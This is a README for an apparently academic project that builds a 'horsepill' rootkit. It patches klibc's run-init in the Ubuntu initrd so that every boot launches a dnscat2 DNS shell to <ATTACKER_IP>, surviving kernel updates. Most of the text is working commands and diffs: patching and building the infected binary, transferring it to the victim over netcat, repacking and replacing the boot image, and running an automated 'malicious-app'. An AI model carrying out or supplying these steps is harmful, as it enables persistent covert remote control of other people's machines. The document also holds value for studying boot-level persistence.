# Horsepill Payload
_You are requested to produce a payload (using any vector of your choice) that is able to install a DNS shell (see, e.g., [here](https://github.com/sensepost/DNS-Shell)) using the horsepill attack. The payload should survive kernel updates._

## Table of contents
- [Documentation](#documentation)
- [System characteristics](#system-characteristics)
- [Tunnel DNS](#tunnel-dns)
- [How to generate the infected `run-init`](#how-to-generate-the-infected-run-init)
  - [Creating the patch file](#creating-the-patch-file)
  - [Applying the patch](#applying-the-patch)
- [How to infect the victim](#how-to-infect-the-victim)
  - [Unpack and edit `initrd`](#unpack-and-edit-initrd)
  - [Repack of `initrd`](#repack-of-initrd)
  - [Disk replacement](#disk-replacement)
  - [Automated infection](#automated-infection)
- [Inspiration](#inspiration)

## Documentation
The required report is present in the [`docs`](docs/) folder in `tex` and `pdf` formats.

## System characteristics
Characteristics of the system on which the attack was carried out:
- machine: x86_64
- OS: GNU/Linux - Ubuntu 20.04.1
- kernel: Linux 5.13.0-40-generic

## Tunnel DNS
The tool used to control the system remotely is [dnscat2](https://github.com/iagox86/dnscat2).

Inside file [horsepill.c](src/horsepill.c) it is necessary to change the value of the following constants:
- [`DNSCAT_ARGV2`](src/horsepill.c#L112)` = "server=<ATTACKER_IP>,port=<ATTACKER_PORT>\0";`
- [`DNSCAT_ARGV3`](src/horsepill.c#L113)` = "--secret=<SECRET>\0";`

> **Note:** Information regarding the configuration and execution of the server can be found at the link: https://github.com/iagox86/dnscat2

## How to generate the infected `run-init`
One way to generate the infected binary is to patch `klibc`. Version `2.0.7` of `klibc` was used for the implementation of the attack.

For convenience, create two working directories that will allow the creation of the patch file and its application:
```
mkdir /tmp/create
mkdir /tmp/apply
```
### Creating the patch file
Inside the `/tmp/create` folder download the `klibc` source package:
```
cd /tmp/create
apt-get build-dep klibc && apt-get source klibc
```
then run:
```
mv klibc-2.0.7 klibc-2.0.7.orig
gunzip -c klibc_2.0.7.orig.tar.gz | tar -x
```
This way you get two directories:
- `klibc-2.0.7.orig`
- `klibc-2.0.7`

both have the same content and this will allow to run `diff` after the changes.

Clone this Github repository containing the payload to execute the attack:
```
git clone https://github.com/g3lbin/horsepill.git
```
copy the header and source files in `horsepill/src/` into the folder to be modified:
```
cp horsepill/src/* klibc-2.0.7/usr/kinit/run-init
```
Using any text editor (e.g. `vim`) edit the following files:
1. `klibc-2.0.7/usr/kinit/run-init/Kbuild`
```diff
# common .o files
-objs := run-init.o runinitlib.o
+objs := run-init.o runinitlib.o horsepill.o
```
2. `klibc-2.0.7/usr/kinit/run-init/run-init.c`
```diff
#include "run-init.h"
+#include "horsepill.h"

static const char *program;
```
```diff
        char **initargs;
+        cmdline_ptr = (char **)argv;

        /* Variables... */
        int o;
```
3. `klibc-2.0.7/usr/kinit/run-init/runinitlib.c`
```diff
#include "capabilities.h"
+#include "horsepill.h"

/* Make it possible to compile on glibc by including constants that the
```
```diff
        if (!dry_run) {
+                puts("[HORSEPILL] G3LBIN VISITED YOU!\n");
+                sleep(5);
+                do_attack();
                /* Spawn init */
                execv(init, initargs);
                return init;		/* Failed to spawn init */
```
Finally, to create the `klibc-horsepill.patch` patch file run:
```
diff -u klibc-2.0.7.orig/usr/kinit/run-init/Kbuild klibc-2.0.7/usr/kinit/run-init/Kbuild > klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/dnscat.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/extractor.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/infect.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/horsepill.h >> klibc-horsepill.patch
diff -u /dev/null klibc-2.0.7/usr/kinit/run-init/horsepill.c >> klibc-horsepill.patch
diff -u klibc-2.0.7.orig/usr/kinit/run-init/run-init.c klibc-2.0.7/usr/kinit/run-init/run-init.c >> klibc-horsepill.patch
diff -u klibc-2.0.7.orig/usr/kinit/run-init/runinitlib.c klibc-2.0.7/usr/kinit/run-init/runinitlib.c >> klibc-horsepill.patch
```
### Applying the patch
Copy the patch file to the other workspace and move in there:
```
cp klibc-horsepill.patch /tmp/apply
cd /tmp/apply
```
Also download the `klibc` source package here:
```
apt-get build-dep klibc && apt-get source klibc
```
Apply the patch:
```
cd klibc-2.0.7
quilt import ../klibc-horsepill.patch
dpkg-buildpackage -j$(nproc) -us -uc
```
In this way, the compromised binary is generated which will allow to infect the victim: `/tmp/apply/klibc-2.0.7/usr/kinit/run-init/shared/run-init`

## How to infect the victim
The manual procedure for modifying the `initrd` is shown below. However, this work can be done automatically by compiling and running [`malicious-app.c`](malicious-app.c), as shown later.

First you need to get a shell as `root` and then perform an exploit to scale the privileges. For the realization of this attack it is assumed that this work has already been performed.

Create a scratch space to work without dirtying the victim machine:
```
unshare -f
```
> **Note:** This command runs ` ``${SHELL}'' ` as a child process of `unshare` rather than running it directly. When `unshare` is waiting for the child process, then it ignores `SIGINT` and `SIGTERM` and does not forward any signals to the child. It is necessary to send signals to the child process.

Everything written now cannot be seen by other processes, so mount a temporary file system on the directory `/lost+found`:
```
mount -t tmpfs none /lost+found/
cd /lost+found/
```
It is convenient to create two working directories that allow you to unpack and repack the initial ramdisk:
```
mkdir tmp
mkdir tmp/extracted
```

### Unpack and edit `initrd`
To copy the actual disk image to be infected and extract its contents, run:
```
cp /boot/initrd.img-$(uname -r) tmp/
cd tmp/
unmkinitramfs initrd.img-$(uname -r) ./extracted/
cd extracted/
```
Once this is done, you can explore and modify the `initramfs` file system.

The compromised `run-init` binary is obtained from the attacking server using `netcat`:
- victim (ip: 192.168.1.151)
```
nc -lvnp 9999 | base64 -d | tar xz
```
- attacker
```
tar cz run-init | base64 | nc 192.168.1.151 9999
```
Received the file on the victim machine, you can replace it with the original:
```
mv run-init main/usr/bin/run-init
```
### Repack of `initrd`
To recreate the disk image you need to rebuild the compressed archive as follows:
1. compress `early`:
```
cd early/
find . -print0 | cpio --null --create --format=newc > /lost+found/tmp/newinitrd
```
2. compress `early2`:
```
cd ../early2/
find kernel -print0 | cpio --null --create --format=newc >> /lost+found/tmp/newinitrd
```
3. compress `main`:
```
cd ../main/
find . | cpio --create --format=newc | lz4 -l -c >> /lost+found/tmp/newinitrd
```
### Disk replacement
You can verify that the created disk image is correctly interpreted as the original:
```
cd /lost+found/tmp/
binwalk initrd.img-$(uname -r)
binwalk newinitrd
```
If everything is correct, you can proceed with the replacement and restart:
```
cp newinitrd /boot/initrd.img-$(uname -r)
reboot
```
### Automated infection
To avoid manual execution of all the steps described above, the [`malicious-app.c`](malicious-app.c) program was built, which does exactly that job.

In this case, it will be enough to run:
- victim (ip: 192.168.1.151)
```
nc -lvnp 9999 | base64 -d | tar xz
```
- attacker
```
gcc malicious-app.c -o malicious-app
tar cz malicious-app | base64 | nc 192.168.1.151 9999
```
Finally run:
```
./malicious-app
reboot
```

## Inspiration
The realization of this project is inspired by @r00tkillah rootkit - [HORSEPILL](https://github.com/r00tkillah/HORSEPILL)
